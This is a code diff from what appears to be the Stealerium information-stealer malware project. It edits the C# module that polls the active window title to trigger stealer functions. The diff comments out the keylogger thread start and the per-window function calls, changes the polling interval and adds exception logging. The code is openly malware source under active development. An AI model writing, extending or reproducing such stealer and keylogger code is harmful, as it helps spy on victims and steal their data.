@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
+using Stealerium.Helpers;
 using Stealerium.Modules.Keylogger;
 
 namespace Stealerium.Modules
@@ -47,17 +48,24 @@ namespace Stealerium.Modules
         // Run title checker
         private static void Run()
         {
-            Keylogger.Keylogger.MainThread.Start();
+            //Keylogger.Keylogger.MainThread.Start();
             var prevActiveWindow = "";
-            while (true)
+            try
             {
-                Thread.Sleep(2000);
-                ActiveWindow = GetActiveWindowTitle();
-                if (ActiveWindow == prevActiveWindow) continue;
-                prevActiveWindow = ActiveWindow;
-                foreach (var f in Functions)
-                    f.Invoke();
+                while (true)
+                {
+                    Thread.Sleep(1000);
+                    ActiveWindow = GetActiveWindowTitle();
+                    
+                    if (ActiveWindow == prevActiveWindow) continue;
+                    prevActiveWindow = ActiveWindow;
+                    /*
+                    foreach (var f in Functions)
+                        f.Invoke();
+                    */
+                }
             }
+            catch(Exception ex) { Logging.LogEx(ex); }
         }
     }
 }
